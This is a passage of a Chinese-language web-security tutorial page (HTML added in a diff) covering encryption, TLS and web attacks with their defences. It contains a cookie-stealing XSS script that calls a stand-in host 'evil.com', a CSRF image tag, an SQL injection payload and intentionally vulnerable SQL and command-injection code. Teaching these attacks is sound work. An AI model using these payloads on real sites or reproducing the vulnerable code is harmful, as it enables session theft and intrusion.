@@ -1,0 +1,857 @@
+
+
+<!DOCTYPE html>
+<html class="writer-html5" lang="zh-CN" data-content_root="../">
+<head>
+  <meta charset="utf-8" /><meta name="viewport" content="width=device-width, initial-scale=1" />
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>网络安全基础 &mdash; OS &amp; Network Core 1.0.0 文档</title>
+      <link rel="stylesheet" type="text/css" href="../_static/pygments.css?v=b86133f3" />
+      <link rel="stylesheet" type="text/css" href="../_static/css/theme.css?v=e59714d7" />
+      <link rel="stylesheet" type="text/css" href="../_static/custom.css?v=f07cb45e" />
+
+  
+    <link rel="shortcut icon" href="../_static/favicon.ico"/>
+      <script src="../_static/jquery.js?v=5d32c60e"></script>
+      <script src="../_static/_sphinx_javascript_frameworks_compat.js?v=2cd50e6c"></script>
+      <script src="../_static/documentation_options.js?v=34088549"></script>
+      <script src="../_static/doctools.js?v=9a2dae69"></script>
+      <script src="../_static/sphinx_highlight.js?v=dc90522c"></script>
+      <script src="../_static/translations.js?v=beaddf03"></script>
+    <script src="../_static/js/theme.js"></script>
+    <link rel="index" title="索引" href="../genindex.html" />
+    <link rel="search" title="搜索" href="../search.html" />
+    <link rel="prev" title="网络安全基础" href="index.html" /> 
+</head>
+
+<body class="wy-body-for-nav"> 
+  <div class="wy-grid-for-nav">
+    <nav data-toggle="wy-nav-shift" class="wy-nav-side">
+      <div class="wy-side-scroll">
+        <div class="wy-side-nav-search"  style="background: #2980B9" >
+
+          
+          
+          <a href="../index.html" class="icon icon-home">
+            OS & Network Core
+          </a>
+<div role="search">
+  <form id="rtd-search-form" class="wy-form" action="../search.html" method="get">
+    <input type="text" name="q" placeholder="搜索文档" aria-label="搜索文档" />
+    <input type="hidden" name="check_keywords" value="yes" />
+    <input type="hidden" name="area" value="default" />
+  </form>
+</div>
+        </div><div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="导航菜单">
+              <p class="caption" role="heading"><span class="caption-text">目录</span></p>
+<ul class="current">
+<li class="toctree-l1"><a class="reference internal" href="../introduction.html">OS &amp; Network Core</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../01-process-thread/index.html">进程与线程</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../02-process-scheduling/index.html">进程调度</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../03-memory-management/index.html">内存管理</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../04-file-system/index.html">文件系统</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../05-concurrency-sync/index.html">并发与同步</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../06-deadlock/index.html">死锁处理</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../07-tcp-ip/index.html">TCP-IP协议详解</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../08-http/index.html">HTTP协议与实战</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../09-socket/index.html">Socket编程实战</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../10-network-tools/index.html">网络工具大全</a></li>
+<li class="toctree-l1 current"><a class="reference internal" href="index.html">网络安全基础</a><ul class="current">
+<li class="toctree-l2 current"><a class="current reference internal" href="#">网络安全基础</a><ul>
+<li class="toctree-l3"><a class="reference internal" href="#id2">💡 核心结论</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#id3">1. 加密技术</a><ul>
+<li class="toctree-l4"><a class="reference internal" href="#id4">1.1 对称加密</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#id5">1.2 非对称加密</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#id6">1.3 哈希函数</a></li>
+</ul>
+</li>
+<li class="toctree-l3"><a class="reference internal" href="#https-tls">2. HTTPS/TLS</a><ul>
+<li class="toctree-l4"><a class="reference internal" href="#tls">2.1 TLS握手过程</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#id7">2.2 证书链</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#id8">2.3 生成自签名证书</a></li>
+</ul>
+</li>
+<li class="toctree-l3"><a class="reference internal" href="#web">3. Web安全</a><ul>
+<li class="toctree-l4"><a class="reference internal" href="#xss">3.1 XSS（跨站脚本攻击）</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#csrf">3.2 CSRF（跨站请求伪造）</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#sql">3.3 SQL注入</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#id9">3.4 命令注入</a></li>
+</ul>
+</li>
+<li class="toctree-l3"><a class="reference internal" href="#id10">4. 身份认证</a><ul>
+<li class="toctree-l4"><a class="reference internal" href="#session">4.1 Session认证</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#jwt">4.2 JWT认证</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#oauth-2-0">4.3 OAuth 2.0</a></li>
+</ul>
+</li>
+<li class="toctree-l3"><a class="reference internal" href="#id11">5. 常见安全头部</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#id12">6. 防火墙和端口管理</a><ul>
+<li class="toctree-l4"><a class="reference internal" href="#iptables">6.1 iptables</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#ufw-ubuntu">6.2 ufw（Ubuntu）</a></li>
+</ul>
+</li>
+<li class="toctree-l3"><a class="reference internal" href="#id13">7. 安全扫描工具</a><ul>
+<li class="toctree-l4"><a class="reference internal" href="#nikto-web">7.1 Nikto（Web扫描）</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#owasp-zap">7.2 OWASP ZAP</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#sqlmap-sql">7.3 SQLMap（SQL注入测试）</a></li>
+</ul>
+</li>
+<li class="toctree-l3"><a class="reference internal" href="#id14">8. 最佳实践</a><ul>
+<li class="toctree-l4"><a class="reference internal" href="#id15">8.1 密码安全</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#id16">8.2 输入验证</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#id17">8.3 日志和监控</a></li>
+</ul>
+</li>
+<li class="toctree-l3"><a class="reference internal" href="#id18">9. 常见问题</a><ul>
+<li class="toctree-l4"><a class="reference internal" href="#q1-https">Q1: HTTPS就一定安全吗？</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#q2-jwt-vs-session">Q2: JWT vs Session？</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#q3-ddos">Q3: 如何防止DDoS？</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#q4">Q4: 安全更新频率？</a></li>
+</ul>
+</li>
+<li class="toctree-l3"><a class="reference internal" href="#id19">参考资源</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+
+        </div>
+      </div>
+    </nav>
+
+    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap"><nav class="wy-nav-top" aria-label="移动版导航菜单"  style="background: #2980B9" >
+          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
+          <a href="../index.html">OS & Network Core</a>
+      </nav>
+
+      <div class="wy-nav-content">
+        <div class="rst-content">
+          <div role="navigation" aria-label="页面导航">
+  <ul class="wy-breadcrumbs">
+      <li><a href="../index.html" class="icon icon-home" aria-label="Home"></a></li>
+          <li class="breadcrumb-item"><a href="index.html">网络安全基础</a></li>
+      <li class="breadcrumb-item active">网络安全基础</li>
+      <li class="wy-breadcrumbs-aside">
+            <a href="../_sources/11-network-security/README.md.txt" rel="nofollow"> 查看页面源码</a>
+      </li>
+  </ul>
+  <hr/>
+</div>
+          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
+           <div itemprop="articleBody">
+             
+  <section class="tex2jax_ignore mathjax_ignore" id="id1">
+<h1>网络安全基础<a class="headerlink" href="#id1" title="Link to this heading"></a></h1>
+<section id="id2">
+<h2>💡 核心结论<a class="headerlink" href="#id2" title="Link to this heading"></a></h2>
+<ol class="arabic simple">
+<li><p><strong>对称加密快但密钥交换困难，非对称加密慢但安全</strong></p></li>
+<li><p><strong>HTTPS通过TLS提供加密、完整性和身份验证</strong></p></li>
+<li><p><strong>防止XSS需转义输出，防止CSRF需验证来源</strong></p></li>
+<li><p><strong>SQL注入通过参数化查询预防，命令注入需严格过滤</strong></p></li>
+<li><p><strong>防火墙、入侵检测和定期更新是安全防护的基础</strong></p></li>
+</ol>
+</section>
+<hr class="docutils" />
+<section id="id3">
+<h2>1. 加密技术<a class="headerlink" href="#id3" title="Link to this heading"></a></h2>
+<section id="id4">
+<h3>1.1 对称加密<a class="headerlink" href="#id4" title="Link to this heading"></a></h3>
+<p><strong>原理</strong>：加密和解密使用同一个密钥</p>
+<p><strong>常用算法</strong>：</p>
+<ul class="simple">
+<li><p><strong>AES</strong>：高级加密标准（推荐）</p></li>
+<li><p><strong>DES</strong>：数据加密标准（已过时）</p></li>
+<li><p><strong>3DES</strong>：三重DES</p></li>
+<li><p><strong>ChaCha20</strong>：流加密</p></li>
+</ul>
+<p><strong>AES示例（Python）</strong>：</p>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="kn">from</span><span class="w"> </span><span class="nn">Crypto.Cipher</span><span class="w"> </span><span class="kn">import</span> <span class="n">AES</span>
+<span class="kn">from</span><span class="w"> </span><span class="nn">Crypto.Random</span><span class="w"> </span><span class="kn">import</span> <span class="n">get_random_bytes</span>
+<span class="kn">from</span><span class="w"> </span><span class="nn">Crypto.Util.Padding</span><span class="w"> </span><span class="kn">import</span> <span class="n">pad</span><span class="p">,</span> <span class="n">unpad</span>
+
+<span class="c1"># 加密</span>
+<span class="n">key</span> <span class="o">=</span> <span class="n">get_random_bytes</span><span class="p">(</span><span class="mi">32</span><span class="p">)</span>  <span class="c1"># 256位密钥</span>
+<span class="n">cipher</span> <span class="o">=</span> <span class="n">AES</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">AES</span><span class="o">.</span><span class="n">MODE_CBC</span><span class="p">)</span>
+<span class="n">plaintext</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;Secret message&quot;</span>
+<span class="n">ciphertext</span> <span class="o">=</span> <span class="n">cipher</span><span class="o">.</span><span class="n">encrypt</span><span class="p">(</span><span class="n">pad</span><span class="p">(</span><span class="n">plaintext</span><span class="p">,</span> <span class="n">AES</span><span class="o">.</span><span class="n">block_size</span><span class="p">))</span>
+<span class="n">iv</span> <span class="o">=</span> <span class="n">cipher</span><span class="o">.</span><span class="n">iv</span>
+
+<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;密文: </span><span class="si">{</span><span class="n">ciphertext</span><span class="o">.</span><span class="n">hex</span><span class="p">()</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+
+<span class="c1"># 解密</span>
+<span class="n">cipher</span> <span class="o">=</span> <span class="n">AES</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">AES</span><span class="o">.</span><span class="n">MODE_CBC</span><span class="p">,</span> <span class="n">iv</span><span class="o">=</span><span class="n">iv</span><span class="p">)</span>
+<span class="n">decrypted</span> <span class="o">=</span> <span class="n">unpad</span><span class="p">(</span><span class="n">cipher</span><span class="o">.</span><span class="n">decrypt</span><span class="p">(</span><span class="n">ciphertext</span><span class="p">),</span> <span class="n">AES</span><span class="o">.</span><span class="n">block_size</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;明文: </span><span class="si">{</span><span class="n">decrypted</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+</pre></div>
+</div>
+<p><strong>特点</strong>：</p>
+<ul class="simple">
+<li><p>✅ 速度快</p></li>
+<li><p>✅ 适合大量数据加密</p></li>
+<li><p>❌ 密钥交换困难</p></li>
+<li><p>❌ 密钥泄露则全部泄露</p></li>
+</ul>
+</section>
+<section id="id5">
+<h3>1.2 非对称加密<a class="headerlink" href="#id5" title="Link to this heading"></a></h3>
+<p><strong>原理</strong>：公钥加密，私钥解密</p>
+<p><strong>常用算法</strong>：</p>
+<ul class="simple">
+<li><p><strong>RSA</strong>：最常用</p></li>
+<li><p><strong>ECC</strong>：椭圆曲线加密（更短的密钥）</p></li>
+<li><p><strong>DSA</strong>：数字签名</p></li>
+</ul>
+<p><strong>RSA示例（Python）</strong>：</p>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="kn">from</span><span class="w"> </span><span class="nn">Crypto.PublicKey</span><span class="w"> </span><span class="kn">import</span> <span class="n">RSA</span>
+<span class="kn">from</span><span class="w"> </span><span class="nn">Crypto.Cipher</span><span class="w"> </span><span class="kn">import</span> <span class="n">PKCS1_OAEP</span>
+
+<span class="c1"># 生成密钥对</span>
+<span class="n">key</span> <span class="o">=</span> <span class="n">RSA</span><span class="o">.</span><span class="n">generate</span><span class="p">(</span><span class="mi">2048</span><span class="p">)</span>
+<span class="n">private_key</span> <span class="o">=</span> <span class="n">key</span><span class="o">.</span><span class="n">export_key</span><span class="p">()</span>
+<span class="n">public_key</span> <span class="o">=</span> <span class="n">key</span><span class="o">.</span><span class="n">publickey</span><span class="p">()</span><span class="o">.</span><span class="n">export_key</span><span class="p">()</span>
+
+<span class="c1"># 加密</span>
+<span class="n">recipient_key</span> <span class="o">=</span> <span class="n">RSA</span><span class="o">.</span><span class="n">import_key</span><span class="p">(</span><span class="n">public_key</span><span class="p">)</span>
+<span class="n">cipher</span> <span class="o">=</span> <span class="n">PKCS1_OAEP</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">recipient_key</span><span class="p">)</span>
+<span class="n">ciphertext</span> <span class="o">=</span> <span class="n">cipher</span><span class="o">.</span><span class="n">encrypt</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;Secret message&quot;</span><span class="p">)</span>
+
+<span class="c1"># 解密</span>
+<span class="n">private_key</span> <span class="o">=</span> <span class="n">RSA</span><span class="o">.</span><span class="n">import_key</span><span class="p">(</span><span class="n">private_key</span><span class="p">)</span>
+<span class="n">cipher</span> <span class="o">=</span> <span class="n">PKCS1_OAEP</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">private_key</span><span class="p">)</span>
+<span class="n">plaintext</span> <span class="o">=</span> <span class="n">cipher</span><span class="o">.</span><span class="n">decrypt</span><span class="p">(</span><span class="n">ciphertext</span><span class="p">)</span>
+</pre></div>
+</div>
+<p><strong>特点</strong>：</p>
+<ul class="simple">
+<li><p>✅ 密钥交换安全</p></li>
+<li><p>✅ 支持数字签名</p></li>
+<li><p>❌ 速度慢</p></li>
+<li><p>❌ 不适合大量数据</p></li>
+</ul>
+</section>
+<section id="id6">
+<h3>1.3 哈希函数<a class="headerlink" href="#id6" title="Link to this heading"></a></h3>
+<p><strong>原理</strong>：将任意长度数据映射为固定长度</p>
+<p><strong>常用算法</strong>：</p>
+<ul class="simple">
+<li><p><strong>SHA-256</strong>：安全哈希算法（推荐）</p></li>
+<li><p><strong>SHA-3</strong>：最新标准</p></li>
+<li><p><strong>MD5</strong>：已不安全，仅用于校验</p></li>
+<li><p><strong>bcrypt</strong>：密码哈希（带盐值）</p></li>
+</ul>
+<p><strong>密码哈希示例</strong>：</p>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="kn">import</span><span class="w"> </span><span class="nn">bcrypt</span>
+
+<span class="c1"># 注册时：哈希密码</span>
+<span class="n">password</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;user_password&quot;</span>
+<span class="n">salt</span> <span class="o">=</span> <span class="n">bcrypt</span><span class="o">.</span><span class="n">gensalt</span><span class="p">()</span>
+<span class="n">hashed</span> <span class="o">=</span> <span class="n">bcrypt</span><span class="o">.</span><span class="n">hashpw</span><span class="p">(</span><span class="n">password</span><span class="p">,</span> <span class="n">salt</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Hashed: </span><span class="si">{</span><span class="n">hashed</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+
+<span class="c1"># 登录时：验证密码</span>
+<span class="k">if</span> <span class="n">bcrypt</span><span class="o">.</span><span class="n">checkpw</span><span class="p">(</span><span class="n">password</span><span class="p">,</span> <span class="n">hashed</span><span class="p">):</span>
+    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Password correct!&quot;</span><span class="p">)</span>
+</pre></div>
+</div>
+<p><strong>特点</strong>：</p>
+<ul class="simple">
+<li><p>✅ 单向函数（不可逆）</p></li>
+<li><p>✅ 固定长度输出</p></li>
+<li><p>✅ 微小改变导致完全不同的哈希值</p></li>
+<li><p>用途：密码存储、文件校验、数字签名</p></li>
+</ul>
+</section>
+</section>
+<hr class="docutils" />
+<section id="https-tls">
+<h2>2. HTTPS/TLS<a class="headerlink" href="#https-tls" title="Link to this heading"></a></h2>
+<section id="tls">
+<h3>2.1 TLS握手过程<a class="headerlink" href="#tls" title="Link to this heading"></a></h3>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="mf">1.</span> <span class="n">Client</span> <span class="n">Hello</span>
+   <span class="o">-</span> <span class="n">支持的TLS版本</span>
+   <span class="o">-</span> <span class="n">支持的加密套件</span>
+   <span class="o">-</span> <span class="n">随机数</span>
+
+<span class="mf">2.</span> <span class="n">Server</span> <span class="n">Hello</span>
+   <span class="o">-</span> <span class="n">选择的TLS版本</span>
+   <span class="o">-</span> <span class="n">选择的加密套件</span>
+   <span class="o">-</span> <span class="n">随机数</span>
+   <span class="o">-</span> <span class="n">服务器证书</span>
+
+<span class="mf">3.</span> <span class="n">客户端验证证书</span>
+   <span class="o">-</span> <span class="n">检查有效期</span>
+   <span class="o">-</span> <span class="n">检查签名</span>
+   <span class="o">-</span> <span class="n">检查域名</span>
+
+<span class="mf">4.</span> <span class="n">密钥交换</span>
+   <span class="o">-</span> <span class="n">客户端生成Pre</span><span class="o">-</span><span class="n">Master</span> <span class="n">Secret</span>
+   <span class="o">-</span> <span class="n">用服务器公钥加密</span>
+   <span class="o">-</span> <span class="n">发送给服务器</span>
+
+<span class="mf">5.</span> <span class="n">生成会话密钥</span>
+   <span class="n">Master</span> <span class="n">Secret</span> <span class="o">=</span> <span class="n">PRF</span><span class="p">(</span><span class="n">Pre</span><span class="o">-</span><span class="n">Master</span><span class="p">,</span> <span class="n">Client</span> <span class="n">Random</span><span class="p">,</span> <span class="n">Server</span> <span class="n">Random</span><span class="p">)</span>
+
+<span class="mf">6.</span> <span class="n">开始加密通信</span>
+   <span class="n">使用Master</span> <span class="n">Secret派生的对称密钥</span>
+</pre></div>
+</div>
+</section>
+<section id="id7">
+<h3>2.2 证书链<a class="headerlink" href="#id7" title="Link to this heading"></a></h3>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>Root CA (根证书)
+  签名 ↓
+Intermediate CA (中间证书)
+  签名 ↓
+Server Certificate (服务器证书)
+</pre></div>
+</div>
+<p><strong>验证证书</strong>：</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="c1"># 查看证书</span>
+$<span class="w"> </span>openssl<span class="w"> </span>s_client<span class="w"> </span>-connect<span class="w"> </span>www.google.com:443<span class="w"> </span>-showcerts
+
+<span class="c1"># 验证证书链</span>
+$<span class="w"> </span>openssl<span class="w"> </span>verify<span class="w"> </span>-CAfile<span class="w"> </span>ca-bundle.crt<span class="w"> </span>server.crt
+
+<span class="c1"># 查看证书详情</span>
+$<span class="w"> </span>openssl<span class="w"> </span>x509<span class="w"> </span>-in<span class="w"> </span>server.crt<span class="w"> </span>-text<span class="w"> </span>-noout
+</pre></div>
+</div>
+</section>
+<section id="id8">
+<h3>2.3 生成自签名证书<a class="headerlink" href="#id8" title="Link to this heading"></a></h3>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="c1"># 生成私钥</span>
+$<span class="w"> </span>openssl<span class="w"> </span>genrsa<span class="w"> </span>-out<span class="w"> </span>server.key<span class="w"> </span><span class="m">2048</span>
+
+<span class="c1"># 生成证书签名请求（CSR）</span>
+$<span class="w"> </span>openssl<span class="w"> </span>req<span class="w"> </span>-new<span class="w"> </span>-key<span class="w"> </span>server.key<span class="w"> </span>-out<span class="w"> </span>server.csr
+
+<span class="c1"># 生成自签名证书</span>
+$<span class="w"> </span>openssl<span class="w"> </span>x509<span class="w"> </span>-req<span class="w"> </span>-days<span class="w"> </span><span class="m">365</span><span class="w"> </span>-in<span class="w"> </span>server.csr<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-signkey<span class="w"> </span>server.key<span class="w"> </span>-out<span class="w"> </span>server.crt
+</pre></div>
+</div>
+</section>
+</section>
+<hr class="docutils" />
+<section id="web">
+<h2>3. Web安全<a class="headerlink" href="#web" title="Link to this heading"></a></h2>
+<section id="xss">
+<h3>3.1 XSS（跨站脚本攻击）<a class="headerlink" href="#xss" title="Link to this heading"></a></h3>
+<p><strong>类型</strong>：</p>
+<ol class="arabic simple">
+<li><p><strong>存储型XSS</strong>：恶意脚本存储在服务器</p></li>
+<li><p><strong>反射型XSS</strong>：恶意脚本在URL中</p></li>
+<li><p><strong>DOM型XSS</strong>：在客户端执行</p></li>
+</ol>
+<p><strong>攻击示例</strong>：</p>
+<div class="highlight-html notranslate"><div class="highlight"><pre><span></span><span class="cm">&lt;!-- 评论输入 --&gt;</span>
+<span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
+<span class="w">  </span><span class="nb">document</span><span class="p">.</span><span class="nx">location</span><span class="o">=</span><span class="s1">&#39;http://evil.com/steal?cookie=&#39;</span><span class="o">+</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span>
+<span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+
+<span class="cm">&lt;!-- URL参数 --&gt;</span>
+http://example.com/search?q=<span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">)&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</pre></div>
+</div>
+<p><strong>防御</strong>：</p>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="c1"># 1. 输出转义</span>
+<span class="kn">from</span><span class="w"> </span><span class="nn">html</span><span class="w"> </span><span class="kn">import</span> <span class="n">escape</span>
+<span class="n">user_input</span> <span class="o">=</span> <span class="s2">&quot;&lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;&quot;</span>
+<span class="n">safe_output</span> <span class="o">=</span> <span class="n">escape</span><span class="p">(</span><span class="n">user_input</span><span class="p">)</span>
+<span class="c1"># &amp;lt;script&amp;gt;alert(&amp;#x27;XSS&amp;#x27;)&amp;lt;/script&amp;gt;</span>
+
+<span class="c1"># 2. 使用模板引擎自动转义</span>
+<span class="c1"># Jinja2, React等默认转义</span>
+
+<span class="c1"># 3. Content Security Policy (CSP)</span>
+<span class="n">response</span><span class="o">.</span><span class="n">headers</span><span class="p">[</span><span class="s1">&#39;Content-Security-Policy&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&quot;default-src &#39;self&#39;&quot;</span>
+
+<span class="c1"># 4. HttpOnly Cookie</span>
+<span class="n">response</span><span class="o">.</span><span class="n">set_cookie</span><span class="p">(</span><span class="s1">&#39;session&#39;</span><span class="p">,</span> <span class="n">value</span><span class="p">,</span> <span class="n">httponly</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+</pre></div>
+</div>
+</section>
+<section id="csrf">
+<h3>3.2 CSRF（跨站请求伪造）<a class="headerlink" href="#csrf" title="Link to this heading"></a></h3>
+<p><strong>攻击示例</strong>：</p>
+<div class="highlight-html notranslate"><div class="highlight"><pre><span></span><span class="cm">&lt;!-- 受害者访问恶意网站 --&gt;</span>
+<span class="p">&lt;</span><span class="nt">img</span> <span class="na">src</span><span class="o">=</span><span class="s">&quot;http://bank.com/transfer?to=attacker&amp;amount=1000&quot;</span><span class="p">&gt;</span>
+
+<span class="cm">&lt;!-- 受害者的Cookie自动发送，请求被执行！ --&gt;</span>
+</pre></div>
+</div>
+<p><strong>防御</strong>：</p>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="c1"># 1. CSRF Token</span>
+<span class="kn">from</span><span class="w"> </span><span class="nn">flask_wtf.csrf</span><span class="w"> </span><span class="kn">import</span> <span class="n">CSRFProtect</span>
+<span class="n">csrf</span> <span class="o">=</span> <span class="n">CSRFProtect</span><span class="p">(</span><span class="n">app</span><span class="p">)</span>
+
+<span class="c1"># 表单中包含token</span>
+<span class="o">&lt;</span><span class="n">form</span> <span class="n">method</span><span class="o">=</span><span class="s2">&quot;POST&quot;</span><span class="o">&gt;</span>
+    <span class="p">{{</span> <span class="n">csrf_token</span><span class="p">()</span> <span class="p">}}</span>
+    <span class="o">&lt;</span><span class="nb">input</span> <span class="n">name</span><span class="o">=</span><span class="s2">&quot;amount&quot;</span> <span class="n">value</span><span class="o">=</span><span class="s2">&quot;100&quot;</span><span class="o">&gt;</span>
+<span class="o">&lt;/</span><span class="n">form</span><span class="o">&gt;</span>
+
+<span class="c1"># 2. SameSite Cookie</span>
+<span class="n">response</span><span class="o">.</span><span class="n">set_cookie</span><span class="p">(</span><span class="s1">&#39;session&#39;</span><span class="p">,</span> <span class="n">value</span><span class="p">,</span> <span class="n">samesite</span><span class="o">=</span><span class="s1">&#39;Lax&#39;</span><span class="p">)</span>
+
+<span class="c1"># 3. 验证Referer</span>
+<span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">headers</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;Referer&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="s1">&#39;https://example.com&#39;</span><span class="p">):</span>
+    <span class="c1"># 允许请求</span>
+    <span class="k">pass</span>
+
+<span class="c1"># 4. 自定义请求头（AJAX）</span>
+<span class="c1"># 跨域请求无法自定义请求头</span>
+<span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;X-Requested-With&#39;</span><span class="p">:</span> <span class="s1">&#39;XMLHttpRequest&#39;</span><span class="p">}</span>
+</pre></div>
+</div>
+</section>
+<section id="sql">
+<h3>3.3 SQL注入<a class="headerlink" href="#sql" title="Link to this heading"></a></h3>
+<p><strong>攻击示例</strong>：</p>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="c1"># 危险代码</span>
+<span class="n">username</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]</span>
+<span class="n">password</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">]</span>
+<span class="n">query</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&quot;SELECT * FROM users WHERE username=&#39;</span><span class="si">{</span><span class="n">username</span><span class="si">}</span><span class="s2">&#39; AND password=&#39;</span><span class="si">{</span><span class="n">password</span><span class="si">}</span><span class="s2">&#39;&quot;</span>
+
+<span class="c1"># 攻击者输入：</span>
+<span class="c1"># username: admin&#39; OR &#39;1&#39;=&#39;1</span>
+<span class="c1"># password: anything</span>
+<span class="c1"># 结果SQL：SELECT * FROM users WHERE username=&#39;admin&#39; OR &#39;1&#39;=&#39;1&#39; AND password=&#39;anything&#39;</span>
+<span class="c1"># 绕过验证！</span>
+</pre></div>
+</div>
+<p><strong>防御</strong>：</p>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="c1"># 1. 参数化查询（最重要）</span>
+<span class="n">cursor</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span>
+    <span class="s2">&quot;SELECT * FROM users WHERE username=? AND password=?&quot;</span><span class="p">,</span>
+    <span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="p">)</span>
+<span class="p">)</span>
+
+<span class="c1"># 2. ORM</span>
+<span class="n">user</span> <span class="o">=</span> <span class="n">User</span><span class="o">.</span><span class="n">query</span><span class="o">.</span><span class="n">filter_by</span><span class="p">(</span><span class="n">username</span><span class="o">=</span><span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="o">=</span><span class="n">password</span><span class="p">)</span><span class="o">.</span><span class="n">first</span><span class="p">()</span>
+
+<span class="c1"># 3. 输入验证</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">re</span>
+<span class="k">if</span> <span class="ow">not</span> <span class="n">re</span><span class="o">.</span><span class="n">match</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;^[a-zA-Z0-9_]+$&#39;</span><span class="p">,</span> <span class="n">username</span><span class="p">):</span>
+    <span class="k">return</span> <span class="s2">&quot;Invalid username&quot;</span>
+
+<span class="c1"># 4. 最小权限原则</span>
+<span class="c1"># 数据库用户只有必要的权限</span>
+</pre></div>
+</div>
+</section>
+<section id="id9">
+<h3>3.4 命令注入<a class="headerlink" href="#id9" title="Link to this heading"></a></h3>
+<p><strong>攻击示例</strong>：</p>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="c1"># 危险代码</span>
+<span class="n">filename</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;file&#39;</span><span class="p">)</span>
+<span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;cat </span><span class="si">{</span><span class="n">filename</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
+
+<span class="c1"># 攻击者输入：</span>
